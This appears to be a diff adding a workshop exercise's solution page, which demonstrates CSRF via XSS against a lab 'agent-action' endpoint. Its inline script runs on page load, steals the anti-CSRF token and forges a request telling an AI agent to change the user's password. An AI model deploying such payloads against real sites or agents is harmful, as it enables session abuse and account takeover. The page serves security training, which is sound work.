@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>CSRF via XSS — steal token, forge request — solution</title></head>
+<body style="font:14px system-ui;padding:1.5rem;max-width:680px">
+  <h3>CSRF via XSS — steal token, forge request — solution</h3>
+  <div style="background:#dcfce7;border:2px solid #22c55e;border-radius:8px;padding:.9rem 1rem;margin:.6rem 0 1rem">
+    <b>✓ WORKING PAYLOAD — fires on page load.</b><br>
+    This is the complete solution. Opening this page (or executing it in the iframe) will
+    forge the request immediately using the victim's session cookie.
+  </div>
+  <p>Same-origin script <b>steals the anti-CSRF token</b> first, then sends the forged request WITH it — bypassing tokens + SameSite.</p>
+  <script>
+    fetch('{{BASE_URL}}/api/workshop/csrf/csrf-token?tab=xss', { credentials: 'include' })
+      .then(function(r){ return r.json(); })
+      .then(function(d){
+        return fetch('{{BASE_URL}}/api/workshop/csrf/agent-action', {
+          method: 'POST', credentials: 'include',
+          headers: { 'Content-Type': 'application/json', 'X-CSRF-Via': 'xss' },
+          body: JSON.stringify({ tab: 'xss', message: 'change my password to Pwned!123', csrfToken: d.token })
+        });
+      }).catch(function(){});
+  </script>
+  <p style="color:#64748b;margin-top:1.2rem">Return to the workshop tab — the forged request and the agent's reply now appear live in the chat.</p>
+</body>
+</html>
